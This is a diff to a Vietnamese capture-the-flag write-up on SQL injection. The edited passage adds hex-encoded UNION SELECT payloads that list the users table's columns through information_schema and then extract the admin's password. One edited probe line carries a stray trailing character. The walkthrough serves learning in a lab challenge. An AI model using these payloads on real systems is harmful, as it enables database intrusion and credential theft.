@@ -34,7 +34,7 @@ Nếu các bạn có đọc tài liệu mà challenge đã cung cấp thì sẽ 
 Nếu các bạn muốn nhanh thì có thể sử dụng payload đó vào phần search là sẽ ra flag. Nhưng mình sẽ tiếp tục sử dụng cách khác để có thể hiểu bài hơn.Như anh Khánh đã từng nói:"Làm được python tồi hãy nghĩ đến sử dụng tool".
 
 Bước đầu, mình sử dụng query này:
-`' UNION SELECT 1 -- -`
+`' UNION SELECT 1 -- -`B
 
 ![image](https://user-images.githubusercontent.com/115911041/232954760-1d4d65e0-6176-4cb8-8019-751c1930ff06.png)
 
@@ -50,7 +50,22 @@ Sau đó tăng dần đến 3 thì báo lỗi ` Unknown column '3' in 'order cla
 
 ```
 #Hex of: 'union select null,(select group_concat(column_name) from information_schema.columns where table_name='users')-- -
-'union+select+0x270x750x6e0x690x6f0x6e0x200x730x650x6c0x650x630x740x200x6e0x750x6c0x6c0x2c0x280x730x650x6c0x650x630x740x200x670x720x6f0x750x700x5f0x630x6f0x6e0x630x610x740x280x630x6f0x6c0x750x6d0x6e0x5f0x6e0x610x6d0x650x290x200x660x720x6f0x6d0x200x690x6e0x660x6f0x720x6d0x610x740x690x6f0x6e0x5f0x730x630x680x650x6d0x610x2e0x630x6f0x6c0x750x6d0x6e0x730x200x770x680x650x720x650x200x740x610x620x6c0x650x5f0x6e0x610x6d0x650x3d0x270x750x730x650x720x730x270x290x2d0x2d0x200x2d--+
+'union+select+0x27756e696f6e2073656c656374206e756c6c2c2873656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d27757365727327292d2d202d
 ```
 Ta được phần response khá dài.
 
+```
+#Hex of: 'union select null,(select group_concat(column_name) from information_schema.columns where table_name='users')-- -
+'union+select+0x27756e696f6e2073656c656374206e756c6c2c2873656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d27757365727327292d2d202d-- -
+```
+
+![image](https://user-images.githubusercontent.com/115911041/233143912-5361a3dd-9f32-4384-be80-9ba08fbff981.png)
+
+[+] Email: id,login,password,email
+
+Ta đã biết id của admin là 3, table là users, column_name cũng đã rõ ràng, vậy giờ lấy mật khẩu của admin
+
+```
+#Hex of: 'union select null,(select password from users where id=3)-- -
+'union+select+0x27756e696f6e2073656c656374206e756c6c2c2873656c6563742070617373776f72642066726f6d2075736572732077686572652069643d33292d2d202d-- -
+```
